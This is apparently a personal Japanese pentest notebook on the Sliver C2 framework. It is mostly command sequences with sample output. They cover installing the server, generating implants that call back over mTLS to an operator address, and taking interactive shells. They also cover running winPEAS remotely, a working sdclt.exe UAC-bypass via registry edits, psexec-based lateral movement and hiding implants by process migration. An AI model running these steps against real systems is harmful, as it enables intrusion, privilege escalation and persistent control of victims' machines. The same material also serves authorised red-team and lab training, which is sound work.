# Pentest

## sliver
Go言語で記述されたC2フレームワーク

参考

https://sliver.sh/sliver/2021/07/07/getting-started.html
https://github.com/BishopFox/sliver/wiki
https://dominicbreuker.com/post/learning_sliver_c2_01_installation/#series-overview
https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
https://securityblog.jp/securityanalyst/contents/000167.php
https://vk9-sec.com/how-to-set-up-use-c2-sliver/
https://redsiege.com/blog/2022/11/introduction-to-sliver/

### インストール
``` bash
mkdir sliver
cd sliver
#gitからバイナリを取得
wget https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-server_linux
#gccが入っているか確認
gcc -h
#取得したバイナリに権限付与
chmod +x ./sliver-server_linux
#エージェント用のポート8888とマルチプレイヤー用のポート31337を開放
sudo ufw allow 8888
sudo ufw allow 31337

#実行
./sliver-server_linux
```

### 攻撃
```
#エージェントの作成。ここでできたファイルを実行させる
generate --mtls 192.168.140.57 --skip-symbols
#リスナーの実行
mtls
#実行状態の確認
jobs
#相手側に実行させると以下のような表示が出る
[*] Session 39083c75 HIDDEN_CRIME - 192.168.140.54:4075 (commando) - windows/amd64 - Wed, 21 Dec 2022 09:45:50 JST
#つながっているエージェント情報の確認
sessions
#IDを指定してエージェントと接続
use 39083c75-e8d6-4e5f-950c-dfedfb9bebe7
#情報取得
info
#ローカルにある.netアセンブリをリモート実行
execute-assembly PEASS-ng/winPEAS/winPEASx64.exe
#ローカルにあるファイルをアップロード
upload /home/kali/tools/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat
#リモートのマシン上でコマンドを実行する。ただし結果は帰ってこない
execute powershell
#シェルを取得。本当に実行するか確認されるのでYesする
shell
#先ほどアップロードしたファイルを実行
winPEAS.bat
#シェルから抜ける
exit
```

### 権限昇格
参考

http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html

```
#sdclt.exeによる権限昇格
#windowsのshellに入る
shell
#レジストリの設定と起動。一つ目のファイル名は実際に実行するものに合わせる
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c C:\Users\command\Downloads\HIDDEN_CRIME.exe" /f
reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
cd C:\windows\system32
sdclt.exe
#実行するとセッションが取れる。タスクマネージャの詳細タブでUACの仮想化を確認して無効になっていればgetsystemで権限昇格が可能

上のレジストリの設定をすると、端末のエクスプローラの操作がすべて指定したファイルになるので終わったらレジストリを戻す
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f

```

### チーム
```
#複数人で攻撃する場合はマルチプレイヤーモードにする
multiplayer
#ローカルのIPとユーザ名を設定したコンフィグファイルを作る
new-operator -l 192.168.140.57 -n player2

#OS毎のクライアントを取得する
https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-client_windows.exe
https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-client_linux
#クライアントをプロンプトから実行するとコンフィグがないとメッセージが出るのでそこの場所にサーバ側で作成したコンフィグファイルを置く
C:\Users\command\Downloads+>sliver-client_windows.exe
No config files found at C:\Users\command\.sliver-client\configs (see --help)
#もう一度実行するとサーバに接続できる。接続後はサーバ側と同じように操作できる
C:\Users\command\Downloads+>sliver-client_windows.exe

```





#試したコマンドと使い方
ps　プロセスリストの表示
-e [exeファイル名]　exeファイル名でフィルタ
-O　リストを全部出す
-o [所有者名]　所有者名でフィルタ
-p [pid]　pidでフィルタ
-c　コマンドライン引数の表示
-T　ツリー表示する


terminate　プロセスの終了
-F 終了するプロセスのpid


upload　ローカルファイルの送信


whoami　リモートのユーザ名を取得


update　sliverのアップデート
-p　プロキシの設定


armory　武器になるアドオンの管理コマンド
-p　プロキシの設定
armory  -p http://ProxyIP:port install all


generate　エージェントの作成
接続方式。それぞれ選択する
--wg
--mtls
--dns
--http
--named-pipe
--tcp-pivot
実行する端末のOS(windows mac linux) それ以外のOSの場合は機能が制限された汎用インプラントの作成がで対応する
--os [OS名]
実行する端末のCPU名　amd64 or 386
--arch [cpu名]
形式(exe  shared service shellcode)serviceはpsexecでセッションを張りなおす時に使う
--format [形式]
 --skip-symbols シンボルの暗号化を省略する

#Windows用
generate --os windows --arch 64bit --mtls [IP]
#サービス
generate --os windows --arch 64bit --mtls 192.168.140.57 --format service

#linux用
generate --os linux --mtls [IP]

インプラントの作成時にWindows,Mac,Linux以外のOSを指定すると機能制限のある汎用インプラントが作成される
```
汎用インプラントのテスト結果
未実行
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  msf-inject         Inject an MSF payload into a process
  pivots             List pivots for active session
  portfwd            In-band TCP port forwarding
  rportfwd           reverse port forwardings
  shikata-ga-nai     Polymorphic binary shellcode encoder (ノ ゜Д゜)ノ ︵ 仕方がない
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy


実行できず
mv ファイル名の変更はできるがファイルを移動することはできない
netstat
ps
procdump
ssh
shell
screenshot
terminate
msf


シェルを取りたい場合はシェルスクリプトを作ってupload
chmodで実行権限を付与して
bash [script名]
でシェルを取れる

```

エージェントにはセッション型とビーコン型がある。
セッション型はセッションを張って常時通信を確保する。
ビーコン型は被害者側で潜伏し必要な時だけセッションを張る




jobs　実行しているリスナーを表示


psexec　リモートマシン上で新しいスライバーをサービスとして立ち上げる。ここで使うprofileはprofileコマンドで作成する

psexec -d [Serviceの説明] -s [Service名] -p [profileファイル] TARGET_FQDN


profiles　psexecで使うprofileの管理コマンド
profiles　作成したプロファイルを確認する

profiles new --format service --skip-symbols --mtls [ホストのIP] [profile名]
例)
profiles new --format service --skip-symbols --mtls 192.168.140.57 test


execute　コマンドプロンプトで実行するようにプログラムを実行できる
-o 結果を出力する

execute -o　プログラムの実行結果を出力する


migrate　プロセスIDを指定してその中にインプラントを隠す。また他のユーザが起動させているプロセスに入れることができればそのユーザの権限が使えるようになる

#試したけどいまいちわからないもの
ssh　ssh接続してコマンドが実行できるそうだがやり方が不明。実行しようとしても以下のエラーが出る。
[server] sliver (HIDDEN_CRIME) > ssh 192.168.140.57 -l kali -P !QAZ2wsx
[!] open : no such file or directory

sideload　リモートでメモリ内の共有ライブラリを読み込んで実行できるらしい









